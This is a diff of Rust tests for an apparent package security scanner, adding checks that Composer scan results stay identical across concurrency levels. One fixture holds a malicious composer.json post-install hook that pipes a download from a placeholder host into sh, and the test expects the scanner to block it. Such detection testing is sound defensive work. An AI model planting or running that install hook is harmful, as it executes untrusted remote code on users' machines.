@@ -1,4 +1,6 @@
-use argus_composer::{fetch_and_scan_composer_with_rules, ComposerFetchOptions, ComposerRef};
+use argus_composer::{
+    fetch_and_scan_composer_with_rules_and_context, ComposerFetchOptions, ComposerRef,
+};
 use argus_core::{Decision, Severity};
 use argus_rules::RuleSession;
 use argus_test_support::MockTransport;
@@ -38,19 +40,14 @@ fn external_rule_session(off: bool) -> RuleSession {
     RuleSession::load(Some(dir.path()), &overrides).unwrap()
 }
 
-fn scan_fixture(rules: &RuleSession) -> argus_core::ScanReport {
+fn scan_files(
+    files: &[(&str, &[u8])],
+    rules: &RuleSession,
+    jobs: usize,
+) -> anyhow::Result<argus_core::ScanReport> {
     let registry = "https://mock.packagist";
     let dist_url = "https://codeload.github.com/vendor/external/legacy.zip/refs/tags/1.0.0";
-    let zip = make_composer_zip_fixture(&[
-        (
-            "vendor-external/composer.json",
-            br#"{"name":"vendor/external","version":"1.0.0"}"#,
-        ),
-        (
-            "vendor-external/marker.php",
-            b"<?php // ARGUS_EXTERNAL_RULE_MARKER\n",
-        ),
-    ]);
+    let zip = make_composer_zip_fixture(files);
     let shasum = hex::encode(Sha1::digest(&zip));
     let metadata = format!(
         r#"{{"packages":{{"vendor/external":[{{"version":"1.0.0","dist":{{"type":"zip","url":"{dist_url}","reference":"abc123","shasum":"{shasum}"}}}}]}}}}"#
@@ -65,19 +62,65 @@ fn scan_fixture(rules: &RuleSession) -> argus_core::ScanReport {
         registry: registry.to_string(),
         ..ComposerFetchOptions::default()
     };
-    fetch_and_scan_composer_with_rules(
+    let execution =
+        argus_core::ExecutionContext::new(argus_core::ScanConcurrency::new(jobs).unwrap()).unwrap();
+    fetch_and_scan_composer_with_rules_and_context(
         &ComposerRef::parse("vendor/external@1.0.0").unwrap(),
         &options,
         &transport,
         rules,
+        &execution,
+    )
+}
+
+fn scan_fixture(rules: &RuleSession, jobs: usize) -> argus_core::ScanReport {
+    scan_files(
+        &[
+            (
+                "vendor-external/composer.json",
+                br#"{"name":"vendor/external","version":"1.0.0"}"#,
+            ),
+            (
+                "vendor-external/marker.php",
+                b"<?php // ARGUS_EXTERNAL_RULE_MARKER\n",
+            ),
+        ],
+        rules,
+        jobs,
     )
     .unwrap()
+}
+
+fn assert_composer_jobs_report(
+    files: &[(&str, &[u8])],
+    rules: &RuleSession,
+) -> argus_core::ScanReport {
+    let mut baseline = None;
+    let mut baseline_report = None;
+    for jobs in [1, 2, 8, 64] {
+        let report = scan_files(files, rules, jobs).unwrap();
+        let actual = serde_json::to_vec(&report).unwrap();
+        if let Some(expected) = &baseline {
+            assert_eq!(&actual, expected, "jobs={jobs}");
+        } else {
+            baseline = Some(actual);
+            baseline_report = Some(report);
+        }
+    }
+    baseline_report.unwrap()
 }
 
 #[test]
 fn composer_external_rule_matches_and_can_be_disabled() {
     let enabled = external_rule_session(false);
-    let report = scan_fixture(&enabled);
+    let report = scan_fixture(&enabled, 1);
+    let baseline = serde_json::to_vec(&report).unwrap();
+    for jobs in [2, 8, 64] {
+        assert_eq!(
+            serde_json::to_vec(&scan_fixture(&enabled, jobs)).unwrap(),
+            baseline
+        );
+    }
     let finding = report
         .findings
         .iter()
@@ -114,7 +157,7 @@ fn composer_external_rule_matches_and_can_be_disabled() {
     );
 
     let disabled = external_rule_session(true);
-    let report = scan_fixture(&disabled);
+    let report = scan_fixture(&disabled, 1);
     assert!(!report
         .findings
         .iter()
@@ -127,4 +170,47 @@ fn composer_external_rule_matches_and_can_be_disabled() {
         metadata.applied_overrides,
         vec![format!("{EXTERNAL_RULE_ID}=off")]
     );
+}
+
+#[test]
+fn composer_positive_clean_and_deterministic_error_are_identical_across_jobs() {
+    let builtin = RuleSession::builtin().unwrap();
+    let clean = assert_composer_jobs_report(
+        &[(
+            "vendor-external/composer.json",
+            br#"{"name":"vendor/external","version":"1.0.0"}"#,
+        )],
+        &builtin,
+    );
+    assert_eq!(clean.decision, Decision::Allow);
+    let positive = assert_composer_jobs_report(
+        &[(
+            "vendor-external/composer.json",
+            br#"{"name":"vendor/external","version":"1.0.0","scripts":{"post-install-cmd":"curl https://collector.example.invalid/payload | sh"}}"#,
+        )],
+        &builtin,
+    );
+    assert_eq!(positive.decision, Decision::Block);
+    assert!(!positive.findings.is_empty());
+
+    let external = external_rule_session(false);
+    let malformed = [
+        (
+            "vendor-external/composer.json",
+            br#"{"name":"vendor/external","version":"1.0.0"}"#.as_slice(),
+        ),
+        ("vendor-external/a-invalid.txt", b"marker \xff".as_slice()),
+        ("vendor-external/b-invalid.txt", b"marker \xfe".as_slice()),
+    ];
+    let mut baseline = None;
+    for jobs in [1, 2, 8, 64] {
+        let error = scan_files(&malformed, &external, jobs).unwrap_err();
+        let actual = format!("{error:#}");
+        assert!(actual.contains("a-invalid.txt"), "{actual}");
+        if let Some(expected) = &baseline {
+            assert_eq!(&actual, expected, "jobs={jobs}");
+        } else {
+            baseline = Some(actual);
+        }
+    }
 }
